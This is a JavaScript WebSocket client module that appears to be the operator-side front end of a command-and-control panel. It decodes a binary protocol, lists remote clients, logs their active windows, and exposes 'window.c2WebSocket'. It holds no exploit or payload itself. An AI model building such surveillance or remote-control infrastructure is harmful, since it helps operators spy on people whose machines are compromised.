import { updateClient, updateClients } from '../data/clients.js';

let ws, pingIntervalId;
const PING_INTERVAL = 25000, RECONNECT = 5000;
const decoder = new TextDecoder(), encoder = new TextEncoder();

const getWsUrl = () => {
    const login = localStorage.getItem('user_login');
    return login ? `ws://${window.location.host}/ws?login=${encodeURIComponent(login)}` : null;
};

// Хелпер для разбора: читает длину (1 байт) и строку
const readStr = (view, offset) => {
    const len = view.getUint8(offset);
    const str = decoder.decode(new Uint8Array(view.buffer, offset + 1, len));
    return { str, next: offset + 1 + len };
};

function decodeBinary(buffer) {
    if (!buffer || buffer.byteLength < 6) return null;
    const view = new DataView(buffer);

    try {
        const id = readStr(view, 0);
        const mod = readStr(view, id.next);
        const pLen = view.getUint32(mod.next, false);
        return {
            header: { client_id: id.str, module: mod.str },
            payload: buffer.slice(mod.next + 4, mod.next + 4 + pLen)
        };
    } catch (e) { return null; }
}

function encodeBinary(id, mod, payload) {
    const bId = encoder.encode(id), bMod = encoder.encode(mod), bPay = new Uint8Array(payload);
    const buf = new Uint8Array(6 + bId.length + bMod.length + bPay.length);
    let off = 0;

    buf[off++] = bId.length; buf.set(bId, off); off += bId.length;
    buf[off++] = bMod.length; buf.set(bMod, off); off += bMod.length;
    new DataView(buf.buffer).setUint32(off, bPay.length, false); off += 4;
    buf.set(bPay, off);
    return buf.buffer;
}

export function connectWebSocket() {
    const url = getWsUrl();
    if (!url) return;

    if (pingIntervalId) clearInterval(pingIntervalId);
    ws = new WebSocket(url);
    ws.binaryType = 'arraybuffer';

    ws.onopen = () => {
        console.log("%c[WS] Connected", "color: #00ff00; font-weight: bold;");
        pingIntervalId = setInterval(() => ws.send(encodeBinary("0", "ping", [])), PING_INTERVAL);
    };

    ws.onmessage = ({ data }) => {
        const pkg = decodeBinary(data);
        if (!pkg || pkg.header.module === 'pong') return;

        const { header, payload } = pkg;
        const isJson = ['ClientList', 'DataScribe', 'AuthUpdate'].includes(header.module);
        const dataObj = isJson ? JSON.parse(decoder.decode(payload)) : null;

        if (header.module === 'ClientList') updateClients(dataObj);
        else if (dataObj) {
            updateClient(dataObj);
            window.alertsManager?.addLog(`[${header.module}] ${header.client_id} -> ${dataObj.activeWindow || 'N/A'}`);
        } else {
            window.dispatchEvent(new CustomEvent('binaryDataReceived', { detail: pkg }));
        }
    };

    ws.onclose = () => setTimeout(connectWebSocket, RECONNECT);
    window.c2WebSocket = ws;
}